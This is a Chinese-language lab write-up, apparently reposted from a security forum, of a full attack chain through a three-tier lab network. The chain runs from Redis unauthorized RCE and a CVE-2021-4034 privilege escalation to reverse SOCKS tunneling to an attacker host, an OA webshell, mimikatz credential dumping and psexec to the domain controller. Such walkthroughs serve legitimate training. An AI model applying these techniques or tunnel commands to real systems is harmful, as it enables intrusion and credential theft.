---
title: 记一次三层网络环境下的域渗透
url: https://buaq.net/go-151225.html
source: unSafe.sh - 不安全
date: 2023-02-28
fetch_date: 2025-10-04T08:13:56.795835
---

# 记一次三层网络环境下的域渗透

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/1a436cf93a8f79972d32e980e41e1e82.jpg)

记一次三层网络环境下的域渗透

靶场网络环境拓扑图:相关说明:DMZ区域：给Ubuntu1配置了两个网卡，一个桥接可以对外提供服务；一个连接在VMnet8上连通第二层网络。第二层网络区域
*2023-2-27 18:41:0
Author: [xz.aliyun.com(查看原文)](/jump-151225.htm)
阅读量:44
收藏*

---

**靶场网络环境拓扑图:**

第二层网络区域：
给Ubuntu2和Windows7都配置了两个网卡，一个连接在VMnet8上连通第二层网络，一个连接在VMnet14上连通第三层网络。

第三次网络区域：
给Windows Server 2012和Windows7都只配置了一个网卡，一个连接在VMnet14上连通第三层网络。

**外网Web渗透:**
通过Kscan资产收集工具进行扫描
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227175915-649385c0-b685-1.jpg)
可见开放了nginx服务,ssh服务,redis服务
在测试发送redis是未授权的,利用方式如下:
redis写入Webshell
redis计划任务反弹shell(CentOS)
redis写入ssh公钥
redis主从复制RCE利用
这里选择进行redis主从复制RCE
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227180418-1936ba7e-b686-1.jpg)
工具地址:<https://github.com/n0b0dyCN/redis-rogue-server>
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227180552-515b0ebe-b686-1.jpg)
这样就获得了一个shell
接下来,我们反弹给MSF一个Meterpreter会话
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227180651-74ae941c-b686-1.jpg)
MSF生成linux马,python开启HTTP服务
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227180749-9740c68a-b686-1.jpg)
MSF设置监听,目标Ubuntu1运行马,获得会话
**提权:**
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227180908-c61196c4-b686-1.jpg)
MSF上传提权辅助脚本
工具地址:<https://github.com/mzet-/linux-exploit-suggester>
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227181109-0e282a86-b687-1.jpg)
检测出来后,这里使用CVE-2021-4034进行提权
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227181159-2c0b04c4-b687-1.jpg)
成功获得root权限
MSF再生成一个linux马,去获得root用户的Meterpreter会话
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227181323-5e5b628e-b687-1.jpg)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227181335-65105db4-b687-1.jpg)
**内网渗透(横向移动):**
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227181438-8aaaba38-b687-1.jpg)
存在两个网卡
MSF进行添加路由
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227181528-a8e0e0e0-b687-1.jpg)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227181546-b33b886a-b687-1.jpg)
再使用Fscan进行扫描第二块网卡的网段
192.168.52.30有个通达OA、还存在MS17-010
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227182253-b22491fa-b688-1.jpg)
这里使用ew启一个反向socks5
攻击机设置:

```
ew_for_Win.exe -s rcsocks -l 1080 -e 1234
```

DMZ区ubuntu1：

```
ew_for_linux64 -s rssocks -d 192.168.137.49 -e 1234
```

配置Proxifier访问攻击机的1080端口来使用内网web服务器上面架设的socks代理服务了
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227182656-42a89dd4-b689-1.jpg)
查看通达OA版本：
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227182743-5f09ad1a-b689-1.jpg)
使用通达OA综合利用工具进行检测
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227182832-7bb98b38-b689-1.jpg)
蚁剑进行连接Webshell
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227182847-852c69e2-b689-1.jpg)
**内网域内信息收集:**
本机信息：
system权限
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227183022-bd7636de-b689-1.jpg)
路由信息：
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227183055-d0ff2684-b689-1.jpg)
ipconfig /all 发现也是 52.0/24 93.0/24两个网段
并且存在域whoamianony.org
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227183130-e622287c-b689-1.jpg)
域控为192.168.93.30
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227183206-fbcdec92-b689-1.jpg)
查看域内主机名：当前是pc1
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227183229-09245188-b68a-1.jpg)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227183334-2fbe4f6a-b68a-1.jpg)
因为可以出网，所以直接执行命令上线了CS
使用mimikatz直接导出了域管和bunny域用户的密码：
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227183458-61f4bc58-b68a-1.jpg)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227183508-67bc2aea-b68a-1.jpg)
所有域用户:
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227183603-88a7a914-b68a-1.jpg)
域管:
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227183701-ab2c4206-b68a-1.jpg)
域控:
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227183744-c4e4e1a8-b68a-1.jpg)
直接使用CS自带的端口扫描，用win7的beacon对93段进行探测：
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227183846-ea038a8e-b68a-1.jpg)
192.168.93.30是域控
然后我们使用smb beacon进行psexec就可以了
![](https://xzfile.aliyuncs.com/media/upload/picture/20230227184003-17cf444e-b68b-1.jpg)
这样就打完三层网络渗透

文章来源: https://xz.aliyun.com/t/12234
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)